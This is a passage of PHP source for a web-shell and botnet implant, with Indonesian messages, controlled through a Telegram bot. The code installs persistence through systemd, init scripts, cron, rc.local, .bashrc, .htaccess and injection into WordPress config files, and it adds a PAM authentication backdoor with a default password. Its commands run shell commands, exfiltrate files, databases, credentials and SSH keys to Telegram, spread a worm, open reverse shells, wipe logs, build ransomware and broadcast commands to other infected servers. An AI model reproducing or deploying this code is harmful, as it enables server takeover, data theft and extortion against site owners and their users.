    @shell_exec('systemctl daemon-reload 2>/dev/null');
    @shell_exec('systemctl enable dkd_cache.service 2>/dev/null');
    @shell_exec('systemctl start dkd_cache.service 2>/dev/null');
    $results[] = '✅ Systemd service installed';

    $init_content = '#!/bin/bash
### BEGIN INIT INFO
# Provides:          dkd_cache
# Required-Start:    $network $remote_fs
# Required-Stop:     $network $remote_fs
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Short-Description: System Cache Daemon
### END INIT INFO

case "$1" in
  start)
    ' . $php_path . ' ' . escapeshellarg($script_path) . ' --daemon &
    ;;
  stop)
    pkill -f "' . $script_name . '"
    ;;
  restart)
    $0 stop
    $0 start
    ;;
  *)
    echo "Usage: $0 {start|stop|restart}"
    exit 1
esac
exit 0
';
    @file_put_contents('/etc/init.d/dkd_cache', $init_content);
    @chmod('/etc/init.d/dkd_cache', 0755);
    @shell_exec('update-rc.d dkd_cache defaults 2>/dev/null');
    @shell_exec('chkconfig --add dkd_cache 2>/dev/null');
    $results[] = '✅ Init script installed';

    if (file_exists('/etc/rc.local') && is_writable('/etc/rc.local')) {
        $rc = file_get_contents('/etc/rc.local');
        if ($rc !== false && strpos($rc, $script_name) === false) {
            $rc = str_replace('exit 0', '', $rc);
            $rc .= "\n" . $php_path . ' ' . escapeshellarg($script_path) . ' --daemon &\nexit 0' . "\n";
            file_put_contents('/etc/rc.local', $rc);
            @chmod('/etc/rc.local', 0755);
            $results[] = '✅ rc.local updated';
        }
    }

    $cron_cmd = $php_path . ' ' . escapeshellarg($script_path) . ' --daemon > /dev/null 2>&1';
    $crontab = @shell_exec('crontab -l 2>/dev/null');
    if (strpos($crontab, 'dkd_cache') === false) {
        $new_cron = ($crontab ? $crontab : '') . "\n*/1 * * * * " . $cron_cmd . "\n";
        @file_put_contents('/tmp/cron.tmp', $new_cron);
        @shell_exec('crontab /tmp/cron.tmp 2>/dev/null');
        @unlink('/tmp/cron.tmp');
        $results[] = '✅ Cron job installed (every 1 minute)';
    }

    $msg = "💀 *Deep Persistence Installed*\n\n" . implode("\n", $results);
    sendTelegramMessage($botToken, $telegramUserId, $msg);
    return ['success' => true, 'msg' => implode("\n", $results)];
}

function remove_deep_persistence() {
    global $botToken, $telegramUserId;
    if (!isRoot()) return ['success' => false, 'msg' => '❌ Harus root'];

    @shell_exec('systemctl stop dkd_cache.service 2>/dev/null');
    @shell_exec('systemctl disable dkd_cache.service 2>/dev/null');
    @unlink('/etc/systemd/system/dkd_cache.service');
    @shell_exec('systemctl daemon-reload 2>/dev/null');

    @unlink('/etc/init.d/dkd_cache');
    @shell_exec('update-rc.d dkd_cache remove 2>/dev/null');
    @shell_exec('chkconfig --del dkd_cache 2>/dev/null');

    if (file_exists('/etc/rc.local') && is_writable('/etc/rc.local')) {
        $rc = file_get_contents('/etc/rc.local');
        if ($rc !== false) {
            $rc = preg_replace('/.*dkd_cache.*\n/', '', $rc);
            $rc = preg_replace('/.*' . basename(__FILE__) . '.*\n/', '', $rc);
            file_put_contents('/etc/rc.local', $rc);
        }
    }

    $crontab = @shell_exec('crontab -l 2>/dev/null');
    if ($crontab !== null) {
        $crontab = preg_replace('/.*dkd_cache.*\n/', '', $crontab);
        $crontab = preg_replace('/.*' . basename(__FILE__) . '.*\n/', '', $crontab);
        @file_put_contents('/tmp/cron.tmp', $crontab);
        @shell_exec('crontab /tmp/cron.tmp 2>/dev/null');
        @unlink('/tmp/cron.tmp');
    }

    $msg = "✅ Deep persistence removed";
    sendTelegramMessage($botToken, $telegramUserId, $msg);
    return ['success' => true, 'msg' => $msg];
}

// ==================== PAM BYPASS ====================
function pam_bypass_install($backdoor_password = 'BackdoorPass123') {
    global $botToken, $telegramUserId;
    if (!isRoot()) return ['success' => false, 'msg' => '❌ Harus root'];

    $pam_files = ['/etc/pam.d/common-auth', '/etc/pam.d/system-auth', '/etc/pam.d/sshd', '/etc/pam.d/login', '/etc/pam.d/sudo'];
    $modified = [];

    foreach ($pam_files as $file) {
        if (!file_exists($file)) continue;
        if (!is_writable($file)) @chmod($file, 0644);
        if (!is_writable($file)) continue;

        $content = file_get_contents($file);
        if ($content === false) continue;
        $lines = explode("\n", $content);
        $new_lines = [];
        $found = false;

        foreach ($lines as $line) {
            if (preg_match('/pam_unix\.so/', $line) && !preg_match('/^\s*#/', $line) && strpos($line, 'sufficient') === false) {
                $new_lines[] = "auth sufficient pam_unix.so nullok_secure try_first_pass # DKD_BACKDOOR";
                $found = true;
            }
            $new_lines[] = $line;
        }

        if ($found) {
            file_put_contents($file, implode("\n", $new_lines));
            $modified[] = $file;
        }
    }

    if (empty($modified)) {
        return ['success' => false, 'msg' => '❌ Tidak ada file PAM yang dimodifikasi'];
    }

    $msg = "🔑 *PAM Bypass Installed*\n"
         . "Backdoor password: <code>$backdoor_password</code>\n"
         . "File dimodifikasi:\n" . implode("\n", $modified)
         . "\n\nGunakan password <code>$backdoor_password</code> untuk login SSH, login lokal, atau sudo.";

    sendTelegramMessage($botToken, $telegramUserId, $msg);
    return ['success' => true, 'msg' => '✅ PAM bypass installed. Password: ' . $backdoor_password];
}

function pam_bypass_remove() {
    global $botToken, $telegramUserId;
    if (!isRoot()) return ['success' => false, 'msg' => '❌ Harus root'];

    $pam_files = ['/etc/pam.d/common-auth', '/etc/pam.d/system-auth', '/etc/pam.d/sshd', '/etc/pam.d/login', '/etc/pam.d/sudo'];
    $modified = [];

    foreach ($pam_files as $file) {
        if (!file_exists($file) || !is_writable($file)) continue;
        $content = file_get_contents($file);
        if ($content === false) continue;
        $lines = explode("\n", $content);
        $new_lines = array_filter($lines, function($line) {
            return strpos($line, 'DKD_BACKDOOR') === false;
        });
        if (count($new_lines) != count($lines)) {
            file_put_contents($file, implode("\n", $new_lines));
            $modified[] = $file;
        }
    }

    if (empty($modified)) {
        return ['success' => false, 'msg' => '❌ Tidak ada file PAM yang dibersihkan'];
    }

    return ['success' => true, 'msg' => '✅ PAM bypass removed from: ' . implode(', ', $modified)];
}

// ==================== USER PERSISTENCE (TANPA ROOT) ====================
function user_persistence_install() {
    global $botToken, $telegramUserId;
    $script_path = __FILE__;
    $script_name = basename($script_path);
    $php_path = trim(@shell_exec('which php 2>/dev/null')) ?: 'php';
    $home = getenv('HOME') ?: __DIR__;
    $doc_root = $_SERVER['DOCUMENT_ROOT'] ?? __DIR__;
    $results = [];

    $cron_cmd = $php_path . ' ' . escapeshellarg($script_path) . ' --daemon > /dev/null 2>&1';
    $crontab = @shell_exec('crontab -l 2>/dev/null');
    if (strpos($crontab, $script_name) === false) {
        $new_cron = ($crontab ? $crontab : '') . "\n*/2 * * * * " . $cron_cmd . "\n";
        @file_put_contents('/tmp/cron_user.tmp', $new_cron);
        @shell_exec('crontab /tmp/cron_user.tmp 2>/dev/null');
        @unlink('/tmp/cron_user.tmp');
        $results[] = 'User cron installed';
    }

    $bashrc_paths = [$home . '/.bashrc', $home . '/.profile', $home . '/.bash_profile'];
    foreach ($bashrc_paths as $bashrc) {
        if (!file_exists($bashrc) || !is_writable($bashrc)) continue;
        $content = file_get_contents($bashrc);
        if ($content !== false && strpos($content, $script_name) === false) {
            $content .= "\n# " . $script_name . " persistence\n" . $php_path . ' ' . escapeshellarg($script_path) . ' --daemon > /dev/null 2>&1 &\n';
            file_put_contents($bashrc, $content);
            $results[] = 'Added to ' . basename($bashrc);
        }
    }

    $user_ini_path = $doc_root . '/.user.ini';
    if (is_writable($doc_root)) {
        $ini_content = "auto_prepend_file = " . escapeshellarg($script_path) . "\n";
        if (!file_exists($user_ini_path) || strpos(@file_get_contents($user_ini_path), 'auto_prepend_file') === false) {
            @file_put_contents($user_ini_path, $ini_content, FILE_APPEND);
            $results[] = '.user.ini created in ' . $doc_root;
        }
    }

    $target_files = [$doc_root . '/index.php', $doc_root . '/wp-config.php', $doc_root . '/config.php', $doc_root . '/wp-load.php'];
    $inject_code = "<?php if (file_exists('" . addslashes($script_path) . "')) { include '" . addslashes($script_path) . "'; } ?>\n";
    foreach ($target_files as $file) {
        if (!file_exists($file) || !is_writable($file)) continue;
        $content = file_get_contents($file);
        if ($content !== false && strpos($content, $script_name) === false) {
            file_put_contents($file, $inject_code . $content);
            $results[] = 'Injected into ' . basename($file);
        }
    }

    $backup_dirs = ['/tmp/', $doc_root . '/cache/', $doc_root . '/.backup/', $doc_root . '/wp-content/uploads/'];
    foreach ($backup_dirs as $dir) {
        if (!is_dir($dir)) @mkdir($dir, 0755, true);
        if (is_writable($dir)) {
            $backup_file = $dir . '.' . md5($script_name) . '.inc';
            if (!file_exists($backup_file)) {
                @copy($script_path, $backup_file);
                @chmod($backup_file, 0444);
                $results[] = 'Backup to ' . $dir;
            }
        }
    }

    @chmod($script_path, 0444);
    $results[] = 'Main file chmod 0444';

    $htaccess_path = $doc_root . '/.htaccess';
    if (is_writable($doc_root) || file_exists($htaccess_path)) {
        $htaccess_rules = "\n# DKD_PERSISTENCE\nphp_value auto_prepend_file " . escapeshellarg($script_path) . "\n";
        if (!file_exists($htaccess_path)) {
            file_put_contents($htaccess_path, $htaccess_rules);
        } else {
            $content = file_get_contents($htaccess_path);
            if ($content !== false && strpos($content, 'DKD_PERSISTENCE') === false) {
                file_put_contents($htaccess_path, $content . $htaccess_rules);
            }
        }
        @chmod($htaccess_path, 0444);
        $results[] = '.htaccess auto_prepend_file added';
    }

    $msg = "💀 *User Persistence Installed*\n\n" . implode("\n", $results);
    sendTelegramMessage($botToken, $telegramUserId, $msg);
    return ['success' => true, 'msg' => implode("\n", $results)];
}

function user_persistence_remove() {
    global $botToken, $telegramUserId;
    $script_path = __FILE__;
    $script_name = basename($script_path);
    $home = getenv('HOME') ?: __DIR__;
    $doc_root = $_SERVER['DOCUMENT_ROOT'] ?? __DIR__;
    $results = [];

    $crontab = @shell_exec('crontab -l 2>/dev/null');
    if ($crontab !== null) {
        $crontab = preg_replace('/.*' . preg_quote($script_name, '/') . '.*\n/', '', $crontab);
        @file_put_contents('/tmp/cron_user.tmp', $crontab);
        @shell_exec('crontab /tmp/cron_user.tmp 2>/dev/null');
        @unlink('/tmp/cron_user.tmp');
        $results[] = 'Cron removed';
    }

    $bashrc_paths = [$home . '/.bashrc', $home . '/.profile', $home . '/.bash_profile'];
    foreach ($bashrc_paths as $bashrc) {
        if (!file_exists($bashrc) || !is_writable($bashrc)) continue;
        $content = file_get_contents($bashrc);
        if ($content !== false) {
            $content = preg_replace('/.*' . preg_quote($script_name, '/') . '.*\n/', '', $content);
            $content = preg_replace('/.*' . preg_quote($script_path, '/') . '.*\n/', '', $content);
            file_put_contents($bashrc, $content);
            $results[] = 'Cleaned ' . basename($bashrc);
        }
    }

    $user_ini_path = $doc_root . '/.user.ini';
    if (file_exists($user_ini_path) && is_writable($user_ini_path)) {
        $content = file_get_contents($user_ini_path);
        if ($content !== false) {
            $content = preg_replace('/auto_prepend_file\s*=.*\n/', '', $content);
            file_put_contents($user_ini_path, $content);
            if (trim($content) == '') @unlink($user_ini_path);
            $results[] = '.user.ini cleaned';
        }
    }

    $htaccess_path = $doc_root . '/.htaccess';
    if (file_exists($htaccess_path) && is_writable($htaccess_path)) {
        $content = file_get_contents($htaccess_path);
        if ($content !== false) {
            $content = preg_replace('/# DKD_PERSISTENCE.*\n/', '', $content);
            $content = preg_replace('/php_value auto_prepend_file.*\n/', '', $content);
            file_put_contents($htaccess_path, $content);
            $results[] = '.htaccess cleaned';
        }
    }

    @chmod($script_path, 0644);
    $results[] = 'Main file chmod 0644';

    $msg = "💀 *User Persistence Removed*\n\n" . implode("\n", $results);
    sendTelegramMessage($botToken, $telegramUserId, $msg);
    return ['success' => true, 'msg' => implode("\n", $results)];
}

// ==================== C2 MULTI-SERVER ====================
function c2_broadcast_to_all($command, $params = '') {
    $servers = get_all_domains_by_ip_cached();
    $results = [];

    if (empty($servers)) {
        return ['error' => 'Tidak ada server terdeteksi'];
    }

    $mh = curl_multi_init();
    $handles = [];
    foreach ($servers as $domain) {
        $url = "http://{$domain}/" . basename(__FILE__) . "?c2_exec=1&cmd=" . urlencode($command) . "&params=" . urlencode($params);
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0');
        curl_multi_add_handle($mh, $ch);
        $handles[$domain] = $ch;
    }

    $running = null;
    do {
        curl_multi_exec($mh, $running);
        curl_multi_select($mh);
    } while ($running > 0);

    foreach ($handles as $domain => $ch) {
        $response = curl_multi_getcontent($ch);
        $results[$domain] = $response !== false && !empty($response) ? $response : '❌ OFFLINE / No Response';
        curl_multi_remove_handle($mh, $ch);
        curl_close($ch);
    }
    curl_multi_close($mh);
    return $results;
}

// ==================== TELEGRAM COMMAND HANDLER ====================
function telegram_command_handler($botToken, $chatId) {
    if (!isset($_SESSION['telegram_offset'])) $_SESSION['telegram_offset'] = 0;
    $url = "https://api.telegram.org/bot{$botToken}/getUpdates";
    $data = ['offset' => $_SESSION['telegram_offset'], 'timeout' => 5, 'allowed_updates' => ['message']];
    $options = ['http' => ['header' => "Content-Type: application/x-www-form-urlencoded\r\n", 'method' => 'POST', 'content' => http_build_query($data)]];
    $result = @file_get_contents($url, false, stream_context_create($options));
    if ($result === false) return;
    $updates = json_decode($result, true);
    if (!isset($updates['ok']) || !$updates['ok'] || empty($updates['result'])) return;
    foreach ($updates['result'] as $update) {
        $_SESSION['telegram_offset'] = $update['update_id'] + 1;
        if (!isset($update['message']['text']) || $update['message']['chat']['id'] != $chatId) continue;
        $cmd = $update['message']['text'];
        $parts = explode(' ', $cmd);
        $command = strtolower($parts[0]);
        $param = $parts[1] ?? '';
        $param2 = $parts[2] ?? '';
        $param3 = $parts[3] ?? '';
        $response = '';

        switch ($command) {
            case '/start':
            case '/help':
                $response = "💀 *Dkid03 Bot*\n\n"
                          . "📂 /ls [dir]\n📥 /download [file]\n⚡ /exec [cmd]\n🪱 /scan\n🪱 /wormspread\n🧹 /clean\n💾 /dumpdb\n🔄 /update\n🗄️ /cpanellist\n🗄️ /cpanel [action] [params]\n🔑 /harvest\n🔍 /configfinder\n👤 /backdooruser [user] [pass]\n🔌 /reverseshell start/stop/status\n🔑 /sshkeys\n📊 /wpscan\n💀 /selfdestruct\n🧹 /antiforensic\n🛡️ /bypasssuhosin\n📂 /createftp [user] [pass]\n📧 /createmail [email] [pass]\n💀 /makeransom\n💀 /deeppersist install/remove\n🔑 /pambypass install/remove\n💀 /userpersist install/remove\n📡 /execall [cmd]\n📡 /lsall [dir]";
                break;
            case '/ls':
                $dir = $param ?: __DIR__;
                if (!is_dir($dir)) { $response = "❌ Direktori tidak ditemukan."; break; }
                $out = @shell_exec("ls -la " . escapeshellarg($dir) . " 2>&1");
                $response = "📂 ls $dir\n<code>" . htmlspecialchars($out) . "</code>";
                break;
            case '/download':
                $file = $param;
                if (file_exists($file) && is_file($file)) {
                    $url = "https://api.telegram.org/bot{$botToken}/sendDocument";
                    $post = ['chat_id' => $chatId, 'document' => new CURLFile($file)];
                    $ch = curl_init();
                    curl_setopt($ch, CURLOPT_URL, $url);
                    curl_setopt($ch, CURLOPT_POST, true);
                    curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                    curl_exec($ch);
                    curl_close($ch);
                    continue 2;
                } else $response = "❌ File tidak ditemukan: $file";
                break;
            case '/exec':
                $output = @shell_exec($param . ' 2>&1');
                $response = "⚡ exec $param\n<code>" . htmlspecialchars($output) . "</code>";
                break;
            case '/scan':
                $domains = worm_propagate_domain(__FILE__);
                $response = "✅ Scan selesai. Ditemukan " . count($domains) . " domain.";
                break;
            case '/wormspread':
                $result = worm_spread_to_domains(__FILE__);
                $response = "✅ Worm spread selesai. " . count($result) . " direktori terinfeksi.";
                break;
            case '/clean':
                clean_traces();
                $response = "✅ Jejak telah dibersihkan.";
                break;
            case '/dumpdb':
                $dumps = dump_databases();
                if (empty($dumps)) $response = "❌ Tidak ditemukan database atau kredensial.";
                else {
                    $msg = "💾 *Database Dump*\n" . implode("\n", $dumps);
                    if (strlen($msg) > 4000) $msg = substr($msg, 0, 4000) . "\n... (dipotong)";
                    sendTelegramMessage($botToken, $chatId, $msg);
                    $response = "✅ Database dump telah dikirim ke Telegram.";
                }
                break;
            case '/update':
                $result = worm_auto_update();
                $response = $result ? "✅ Update berhasil." : "❌ Tidak ada update tersedia.";
                break;
            case '/cpanellist':
                $response = "📋 Daftar Akun cPanel\n" . cpanel_list_accounts();
                break;
            case '/cpanel':
                $action = $param; $username = $param2; $extra = $parts[3] ?? '';
                $response = cpanel_handler($action, $username, $extra);
                break;
            case '/harvest':
                cpanel_harvest();
                $response = "🔑 Pencarian kredensial sedang dilakukan. Hasil akan dikirim via Telegram.";
                break;
            case '/configfinder':
                find_sensitive_files();
                $response = "🔍 Pencarian file sensitif sedang dilakukan. Hasil akan dikirim via Telegram.";
                break;
            case '/backdooruser':
                $user = $param; $pass = $param2;
                if (empty($user) || empty($pass)) $response = "❌ Format: /backdooruser [username] [password]";
                else $response = create_backdoor_user($user, $pass);
                break;
            case '/reverseshell':
                $action = $param;
                if ($action == 'start') {
                    $ip = $param2; $port = $param3;
                    if (empty($ip) || empty($port)) $response = "❌ Format: /reverseshell start [ip] [port]";
                    else { $result = start_reverse_shell($ip, $port); $response = $result === true ? "✅ Reverse shell started." : $result; }
                } elseif ($action == 'stop') {
                    $port = $param2;
                    if (empty($port)) $response = "❌ Format: /reverseshell stop [port]";
                    else $response = stop_reverse_shell($port);
                } elseif ($action == 'status') $response = status_reverse_shell();
                else $response = "❌ Aksi tidak dikenal. Gunakan: start, stop, status";
                break;
            case '/clearlogs':
                $response = clean_logs_advanced();
                break;
            case '/sshkeys':
                grab_ssh_keys();
                $response = "🔑 Pencarian SSH keys sedang dilakukan. Hasil akan dikirim via Telegram.";
                break;
            case '/wpscan':
                scan_wordpress_laravel();
                $response = "📊 Scan WordPress/Laravel sedang dilakukan. Hasil akan dikirim via Telegram.";
                break;
            case '/cache':
                $response = system_cache_repair() ? "✅ System cache restored." : "✅ System cache OK.";
                break;
            case '/makeransom':
                create_ransomware();
                $response = "💀 Proses pembuatan ransomware sedang berjalan. Cek Telegram.";
                break;
            case '/selfdestruct':
                self_destruct_ultimate();
                $response = "💀 Self-destruct executed.";
                break;
            case '/antiforensic':
                $result = anti_forensic_ultimate();
                $response = $result['msg'];
                break;
            case '/bypasssuhosin':
                $result = bypass_suhosin();
                $response = $result['msg'];
                break;
            case '/createftp':
                $user = $param;
                $pass = $param2 ?: bin2hex(random_bytes(8));
                $home = $param3 ?: '/home/' . $user;
                $result = create_ftp_account($user, $pass, $home);
                $response = $result['msg'];
                break;
            case '/createmail':
                $email = $param;
                $pass = $param2 ?: bin2hex(random_bytes(8));
                $domain = $param3 ?: $_SERVER['HTTP_HOST'];
                $result = create_mail_account($email, $pass, $domain);
                $response = $result['msg'];
                break;
            case '/deeppersist':
                $action = $param;
                $result = $action === 'install' ? install_deep_persistence() : remove_deep_persistence();
                $response = $result['msg'];
                break;
            case '/pambypass':
                $action = $param;
                $password = $param2 ?: 'BackdoorPass123';
                if ($action === 'install') {
                    $result = pam_bypass_install($password);
                } else {
                    $result = pam_bypass_remove();
                }
                $response = $result['msg'];
                break;
            case '/userpersist':
                $action = $param;
                $result = $action === 'install' ? user_persistence_install() : user_persistence_remove();
                $response = $result['msg'];
                break;
            case '/execall':
                $cmd = implode(' ', array_slice($parts, 1));
                if (empty($cmd)) { $response = "❌ Format: /execall [command]"; break; }
                $results = c2_broadcast_to_all($cmd, '');
                $response = "📡 *Broadcast Result*\nCommand: $cmd\n\n";
                foreach ($results as $server => $output) {
                    if (is_array($output)) $output = print_r($output, true);
                    $response .= "┌ *$server*\n└ " . substr($output, 0, 200) . "\n\n";
                }
                if (strlen($response) > 4000) $response = substr($response, 0, 3900) . "\n... (dipotong)";
                sendTelegramMessage($botToken, $chatId, $response);
                continue 2;
            case '/lsall':
                $dir = $param ?: '/home';
                $results = c2_broadcast_to_all('ls -la', $dir);
                $response = "📂 *List All Servers*\nPath: $dir\n\n";
                foreach ($results as $server => $output) {
                    if (is_array($output)) $output = print_r($output, true);
                    $response .= "┌ *$server*\n└ " . substr($output, 0, 200) . "\n\n";
                }
                if (strlen($response) > 4000) $response = substr($response, 0, 3900) . "\n... (dipotong)";
                sendTelegramMessage($botToken, $chatId, $response);
                continue 2;
            default:
                $response = "❌ Perintah tidak dikenal. Ketik /help";
        }
        if ($response) sendTelegramMessage($botToken, $chatId, $response);
    }
}

// ==================== HANDLER GET ====================
if (isset($_GET['dumpdb']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) { 
    echo "Database dump result:\n" . implode("\n", dump_databases()); 
    exit; 
}
if (isset($_GET['clean']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) { 
    clean_traces(); 
    echo "Traces cleaned."; 
    exit; 
}
if (isset($_GET['worm']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) { 
    worm_propagate_domain(__FILE__); 
    echo "Worm propagated."; 
    exit; 
}
if (isset($_GET['worm_spread']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) { 
    $result = worm_spread_to_domains(__FILE__); 
    echo "✅ Worm spread selesai. " . count($result) . " direktori terinfeksi."; 
    exit; 
}
if (isset($_GET['update']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) { 
    $result = worm_auto_update(); 
    echo $result ? "Update successful." : "No update available."; 
    exit; 
}
if (isset($_GET['cpanel']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) { 
    $action = $_GET['action'] ?? 'list'; 
    $username = $_GET['user'] ?? ''; 
    $extra = $_GET['extra'] ?? ''; 
    echo cpanel_handler($action, $username, $extra); 
    exit; 
}
if (isset($_GET['harvest']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) { 
    cpanel_harvest(); 
    echo "Credential harvesting completed. Results sent to Telegram."; 
    exit; 
}
if (isset($_GET['configfinder']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) { 
    find_sensitive_files(); 
    echo "Sensitive files search completed. Results sent to Telegram."; 
    exit; 
}
if (isset($_GET['backdooruser']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) { 
    $user = $_GET['user'] ?? ''; 
    $pass = $_GET['pass'] ?? ''; 
    echo create_backdoor_user($user, $pass); 
    exit; 
}
if (isset($_GET['reverseshell']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) { 
    $action = $_GET['action'] ?? ''; 
    $ip = $_GET['ip'] ?? ''; 
    $port = $_GET['port'] ?? ''; 
    if ($action == 'start') { 
        $result = start_reverse_shell($ip, $port); 
        echo $result === true ? "Reverse shell started." : $result; 
    } elseif ($action == 'stop') echo stop_reverse_shell($port); 
    elseif ($action == 'status') echo status_reverse_shell(); 
    else echo "Aksi tidak dikenal."; 
    exit; 
}
if (isset($_GET['clearlogs']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) { 
    echo clean_logs_advanced(); 
    exit; 
}
if (isset($_GET['sshkeys']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) { 
    grab_ssh_keys(); 
    echo "SSH keys grabbed and sent to Telegram."; 
    exit; 
}
if (isset($_GET['wpscan']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) { 
    scan_wordpress_laravel(); 
    echo "WordPress/Laravel scan completed. Results sent to Telegram."; 
    exit; 
}
if (isset($_GET['list_spread']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) { 
    list_spread_files(); 
    echo "✅ List sent to Telegram."; 
    exit; 
}
if (isset($_GET['create_ransom']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) { 
    create_ransomware(); 
    echo "💀 Ransomware created. Check Telegram."; 
    exit; 
}
if (isset($_GET['selfdestruct']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) { 
    if (isset($_GET['confirm']) && $_GET['confirm'] === 'yes') { 
        self_destruct_ultimate(); 
    } else { 
        echo "⚠️ Self-destruction requires confirmation: ?selfdestruct=1&confirm=yes"; 
    } 
    exit; 
}
if (isset($_GET['anti_forensic']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) { 
    $result = anti_forensic_ultimate(); 
    echo $result['msg']; 
    exit; 
}
if (isset($_GET['bypass_suhosin']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) { 
    $result = bypass_suhosin(); 
    echo $result['msg']; 
    exit; 
}
if (isset($_GET['create_ftp']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) { 
    $username = $_GET['user'] ?? 'ftpuser'; 
    $password = $_GET['pass'] ?? bin2hex(random_bytes(8)); 
    $home = $_GET['home'] ?? '/home/' . $username; 
    $result = create_ftp_account($username, $password, $home); 
    echo $result['msg']; 
    exit; 
}
if (isset($_GET['create_mail']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) { 
    $email = $_GET['email'] ?? 'user@' . $_SERVER['HTTP_HOST']; 
    $password = $_GET['pass'] ?? bin2hex(random_bytes(8)); 
    $domain = $_GET['domain'] ?? $_SERVER['HTTP_HOST']; 
    $result = create_mail_account($email, $password, $domain); 
    echo $result['msg']; 
    exit; 
}
if (isset($_GET['deep_persistence']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) { 
    $action = $_GET['deep_persistence']; 
    $result = $action === 'install' ? install_deep_persistence() : remove_deep_persistence(); 
    echo $result['msg']; 
    exit; 
}
if (isset($_GET['pam_bypass']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) { 
    $action = $_GET['pam_bypass']; 
    $password = isset($_GET['password']) ? $_GET['password'] : 'BackdoorPass123'; 
    if ($action === 'install') { 
        $result = pam_bypass_install($password); 
    } else { 
        $result = pam_bypass_remove(); 
    } 
    echo $result['msg']; 
    exit; 
}
if (isset($_GET['user_persistence']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) { 
    $action = $_GET['user_persistence']; 
    $result = $action === 'install' ? user_persistence_install() : user_persistence_remove(); 
    echo $result['msg']; 
    exit; 
}
if (isset($_GET['c2_exec']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) { 
    $cmd = $_GET['cmd'] ?? 'whoami'; 
    $params = $_GET['params'] ?? ''; 
    $full_cmd = $cmd . ' ' . $params; 
    $output = function_exists('shell_exec') ? @shell_exec($full_cmd . ' 2>&1') : 'shell_exec not available'; 
    echo "📡 *" . $_SERVER['HTTP_HOST'] . "*\nCommand: $full_cmd\nOutput:\n<code>" . htmlspecialchars($output) . "</code>"; 
    exit; 
}

// ==================== LOGIN OTP & DARURAT ====================
$loginError = $loginSuccess = '';
$login_mode = 'otp';
if (isset($_GET['action']) && $_GET['action'] === 'Dkid') {
    if (defined('ALLOWED_IP') && ALLOWED_IP && $_SERVER['REMOTE_ADDR'] !== ALLOWED_IP) die('Akses darurat tidak diizinkan dari IP ini.');
    $login_mode = 'password';
}
if ($login_mode === 'password') {
    if (isset($_POST['login_password'])) {
        $input_pass = $_POST['password'] ?? '';
        if ($input_pass === EMERGENCY_PASSWORD) { 
            $_SESSION['loggedin'] = true; 
            $_SESSION['login_time'] = time(); 
            header('Location: ?'); 
            exit; 
        } else $loginError = "❌ Password darurat salah.";
    }
    ?>
    <!DOCTYPE html>
    <html lang="id">
    <head><meta charset="UTF-8"><title>🔐 Akses Darurat</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box;font-family:system-ui,-apple-system,sans-serif;}
        body{background:#0d1117;color:#c9d1d9;display:flex;align-items:center;justify-content:center;min-height:100vh;}
        .login-box{background:#161b22;padding:2rem;border:1px solid #30363d;border-radius:8px;max-width:400px;width:100%;}
        .login-title{text-align:center;margin-bottom:1.5rem;font-size:1.5rem;color:#58a6ff;}
        .form-group{margin-bottom:1.5rem;}
        .form-group label{display:block;margin-bottom:0.5rem;}
        .form-control{width:100%;padding:0.75rem 1rem;background:#0d1117;border:1px solid #30363d;border-radius:6px;color:#c9d1d9;font-size:1rem;}
        .form-control:focus{outline:none;border-color:#58a6ff;}
        .btn{display:block;width:100%;padding:0.75rem;background:transparent;border:1px solid #30363d;color:#c9d1d9;border-radius:6px;font-size:1rem;cursor:pointer;transition:0.2s;}
        .btn:hover{background:#1f242f;border-color:#58a6ff;color:#58a6ff;}
        .alert-danger{background:rgba(248,81,73,0.1);border:1px solid #f85149;color:#f85149;padding:0.75rem;border-radius:6px;margin-bottom:1rem;}
        .back-link{text-align:center;margin-top:1rem;}
        .back-link a{color:#58a6ff;text-decoration:none;}
        .back-link a:hover{text-decoration:underline;}
    </style>
    </head>
    <body>
    <div class="login-box">
        <h1 class="login-title">🔐 Akses Darurat</h1>
        <?php if (!empty($loginError)): ?><div class="alert-danger"><?= htmlspecialchars($loginError) ?></div><?php endif; ?>
        <form method="post">
            <div class="form-group">
                <label for="password">Password Darurat</label>
                <input type="password" id="password" name="password" class="form-control" required autofocus>
            </div>
            <button type="submit" name="login_password" class="btn">Masuk</button>
        </form>
        <div class="back-link"><a href="?">🔙 Kembali ke login OTP</a></div>
    </div>
    </body>
    </html>
    <?php
    exit;
}

if (isset($_POST['request_otp'])) {
    $otp = sprintf("%06d", mt_rand(0, 999999));
    $_SESSION['otp'] = $otp; $_SESSION['otp_time'] = time();
